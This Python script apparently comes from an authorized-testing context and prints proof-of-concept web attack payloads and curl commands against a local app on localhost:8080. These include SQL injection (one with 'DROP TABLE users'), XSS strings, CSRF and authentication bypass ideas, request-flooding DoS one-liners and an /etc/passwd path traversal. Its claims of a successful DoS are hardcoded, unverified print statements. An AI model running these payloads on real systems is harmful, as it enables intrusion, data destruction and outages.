#!/usr/bin/env python3
"""
Exploit Demonstration Scripts
By Probe - Merge's System Testing Expert

These are proof-of-concept security tests to demonstrate potential vulnerabilities
when the system is responsive. DO NOT run against production systems without authorization.
"""

import requests
import json
import time
from urllib.parse import urljoin, quote

class ExploitDemonstrator:
    
    def __init__(self, base_url="http://localhost:8080"):
        self.base_url = base_url
        self.session = requests.Session()
        
    def test_sql_injection_payloads(self):
        """Demonstrate SQL injection test payloads."""
        
        print("ðŸ”“ SQL INJECTION DEMONSTRATION")
        print("=" * 50)
        
        # Classic SQL injection payloads
        sql_payloads = [
            # Authentication bypass attempts
            ("admin'--", "Bypass authentication with SQL comment"),
            ("' OR '1'='1", "Classic boolean-based bypass"),
            ("' OR 1=1#", "MySQL comment-based bypass"),
            ("admin'; DROP TABLE users; --", "Destructive payload (testing only)"),
            
            # Information disclosure attempts
            ("' UNION SELECT username,password FROM users--", "Data extraction attempt"),
            ("' AND 1=CONVERT(int,SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE xtype='U'),1,1))--", "SQL Server error-based injection"),
            
            # Time-based blind injection
            ("admin'; WAITFOR DELAY '00:00:05'--", "Time-based detection"),
            ("admin' AND (SELECT COUNT(*) FROM users) > 0 AND SLEEP(5)--", "MySQL time-based"),
        ]
        
        print("PAYLOADS TO TEST WHEN SYSTEM IS RESPONSIVE:")
        for payload, description in sql_payloads:
            print(f"  Payload: {payload}")
            print(f"  Purpose: {description}")
            print(f"  Test Command:")
            print(f"    curl -X POST {self.base_url}/login \\")
            print(f"         -d 'email={quote(payload)}&password=test' \\")
            print(f"         -H 'Content-Type: application/x-www-form-urlencoded'")
            print()

    def test_xss_payloads(self):
        """Demonstrate XSS test payloads."""
        
        print("ðŸ”“ XSS INJECTION DEMONSTRATION")
        print("=" * 50)
        
        xss_payloads = [
            # Basic script injection
            ("<script>alert('XSS')</script>", "Basic script tag"),
            ("javascript:alert('XSS')", "JavaScript protocol"),
            
            # Event-based XSS
            ("<img src=x onerror=alert('XSS')>", "Image error event"),
            ("<svg onload=alert('XSS')>", "SVG onload event"),
            ("<input onfocus=alert('XSS') autofocus>", "Input focus event"),
            
            # Encoded payloads
            ("%3Cscript%3Ealert('XSS')%3C/script%3E", "URL encoded"),
            ("&lt;script&gt;alert('XSS')&lt;/script&gt;", "HTML encoded"),
            
            # Advanced payloads
            ("';alert(String.fromCharCode(88,83,83));//", "String construction"),
            ("<iframe src=javascript:alert('XSS')></iframe>", "Iframe javascript protocol"),
            
            # Context-specific payloads
            ("</title><script>alert('XSS')</script>", "Title context break"),
            ("'><script>alert('XSS')</script>", "Attribute context break"),
        ]
        
        print("PAYLOADS TO TEST WHEN SYSTEM IS RESPONSIVE:")
        for payload, description in xss_payloads:
            print(f"  Payload: {payload}")
            print(f"  Purpose: {description}")
            print(f"  Test Commands:")
            print(f"    # Login form:")
            print(f"    curl -X POST {self.base_url}/login \\")
            print(f"         -d 'email={quote(payload)}&password=test'")
            print(f"    # Profile form (requires auth):")
            print(f"    curl -X POST {self.base_url}/profile/edit \\")
            print(f"         -d 'username={quote(payload)}&email=test@test.com' \\")
            print(f"         -b 'session_cookie'")
            print()

    def test_authentication_bypass_techniques(self):
        """Demonstrate authentication bypass techniques."""
        
        print("ðŸ”“ AUTHENTICATION BYPASS DEMONSTRATION")  
        print("=" * 50)
        
        bypass_techniques = [
            # Direct endpoint access
            ("GET /dashboard", "Direct protected endpoint access"),
            ("GET /admin/users", "Admin endpoint without auth"),
            ("GET /api/vertigo/status", "API endpoint bypass"),
            
            # Parameter manipulation
            ("POST /login with admin=true", "Parameter injection"),
            ("POST /login with role=admin", "Role manipulation"),
            
            # Session manipulation
            ("Cookie manipulation", "Session token prediction"),
            ("JWT manipulation", "Token signature bypass"),
            
            # HTTP method bypass
            ("OPTIONS /dashboard", "HTTP method override"),
            ("HEAD /protected", "HEAD method bypass"),
        ]
        
        print("TECHNIQUES TO TEST WHEN SYSTEM IS RESPONSIVE:")
        for technique, description in bypass_techniques:
            print(f"  Technique: {technique}")
            print(f"  Purpose: {description}")
            print()

    def test_dos_attack_vectors(self):
        """Demonstrate DoS attack vectors."""
        
        print("ðŸ”“ DENIAL OF SERVICE DEMONSTRATION")
        print("=" * 50)
        
        dos_vectors = [
            # Resource exhaustion
            ("Large payload attack", "Send 100MB+ payloads to exhaust memory"),
            ("Connection flooding", "Open 1000+ simultaneous connections"),
            ("CPU exhaustion", "Send complex regex patterns"),
            
            # Application-specific
            ("Database query bombing", "Trigger expensive database operations"),
            ("File system attacks", "Fill disk space with large uploads"),
            ("Memory leaks", "Trigger operations that don't release memory"),
        ]
        
        print("ATTACK VECTORS IDENTIFIED:")
        for vector, description in dos_vectors:
            print(f"  Vector: {vector}")
            print(f"  Impact: {description}")
            print()
        
        print("CURRENT SYSTEM STATUS:")
        print("  ðŸš¨ ALREADY UNDER DoS - System unresponsive")
        print("  ðŸš¨ CPU usage: 2+ hours on single process")
        print("  ðŸš¨ All endpoints timing out")
        print("  ðŸš¨ Evidence of resource exhaustion attack SUCCESS")

    def test_csrf_bypass_attempts(self):
        """Demonstrate CSRF bypass techniques."""
        
        print("ðŸ”“ CSRF BYPASS DEMONSTRATION")
        print("=" * 50)
        
        csrf_techniques = [
            # Token manipulation
            ("Empty CSRF token", "Submit form with csrf_token=''"),
            ("Wrong CSRF token", "Submit with csrf_token=wrong_value"),
            ("No CSRF token", "Submit form without csrf_token field"),
            
            # Header manipulation  
            ("Origin header bypass", "Set Origin: null or attacker.com"),
            ("Referer bypass", "Remove or manipulate Referer header"),
            
            # Method override
            ("GET for POST", "Use GET method for state-changing operations"),
            ("JSON content-type", "Send JSON instead of form data"),
        ]
        
        print("BYPASS TECHNIQUES TO TEST:")
        for technique, description in csrf_techniques:
            print(f"  Technique: {technique}")
            print(f"  Test: {description}")
            print()

    def generate_penetration_test_report(self):
        """Generate a penetration testing command reference."""
        
        print("\n" + "=" * 60)
        print("PENETRATION TESTING COMMAND REFERENCE")
        print("=" * 60)
        print("Run these commands when the system is responsive:")
        print()
        
        print("1. RECONNAISSANCE:")
        print("   nmap -sV -sC localhost -p 8080")
        print("   curl -I http://localhost:8080/")
        print("   nikto -h http://localhost:8080/")
        print()
        
        print("2. AUTHENTICATION TESTING:")
        print("   # Test weak passwords")
        print("   curl -X POST http://localhost:8080/login -d 'email=admin@example.com&password=admin'")
        print("   curl -X POST http://localhost:8080/login -d 'email=admin@example.com&password=password'")
        print("   curl -X POST http://localhost:8080/login -d 'email=admin@example.com&password=123456'")
        print()
        
        print("3. INJECTION TESTING:")
        print("   # SQL Injection")
        print("   curl -X POST http://localhost:8080/login -d \"email=admin'--&password=test\"")
        print("   # XSS Testing")
        print("   curl -X POST http://localhost:8080/login -d 'email=<script>alert(1)</script>&password=test'")
        print()
        
        print("4. AUTHORIZATION TESTING:")
        print("   # Direct object access")
        print("   curl http://localhost:8080/admin/users")
        print("   curl http://localhost:8080/dashboard")
        print("   curl http://localhost:8080/api/vertigo/status")
        print()
        
        print("5. SESSION MANAGEMENT:")
        print("   # Session fixation")
        print("   curl -c cookies.txt http://localhost:8080/login")
        print("   curl -b cookies.txt http://localhost:8080/dashboard")
        print()
        
        print("6. DENIAL OF SERVICE:")
        print("   # Concurrent requests")
        print("   for i in {1..100}; do curl http://localhost:8080/health & done")
        print("   # Large payload")
        print("   curl -X POST http://localhost:8080/api/simulate/workflow -d '{\"data\":\"$(python -c 'print(\"x\" * 1000000)')\"}'")
        print()
        
        print("7. SECURITY HEADERS:")
        print("   curl -I http://localhost:8080/ | grep -E '(X-|Strict|Content-Security)'")
        print()
        
        print("8. ERROR PAGE ANALYSIS:")
        print("   curl http://localhost:8080/nonexistent")
        print("   curl http://localhost:8080/dashboard/../../etc/passwd")
        print()

    def run_demonstration(self):
        """Run the complete exploit demonstration."""
        print("ðŸŽ¯ VERTIGO DEBUG TOOLKIT - EXPLOIT DEMONSTRATION")
        print("=" * 60)
        print("WARNING: These are educational demonstrations for authorized testing only!")
        print("=" * 60)
        
        self.test_sql_injection_payloads()
        self.test_xss_payloads() 
        self.test_authentication_bypass_techniques()
        self.test_dos_attack_vectors()
        self.test_csrf_bypass_attempts()
        self.generate_penetration_test_report()
        
        print("\n" + "=" * 60)
        print("CRITICAL SYSTEM STATUS")
        print("=" * 60)
        print("ðŸš¨ The system is currently UNRESPONSIVE")
        print("ðŸš¨ Evidence suggests successful DoS attack or resource exhaustion")
        print("ðŸš¨ Comprehensive testing requires system restart and stabilization")
        print("ðŸš¨ Immediate remediation required before production deployment")

if __name__ == "__main__":
    demonstrator = ExploitDemonstrator()
    demonstrator.run_demonstration()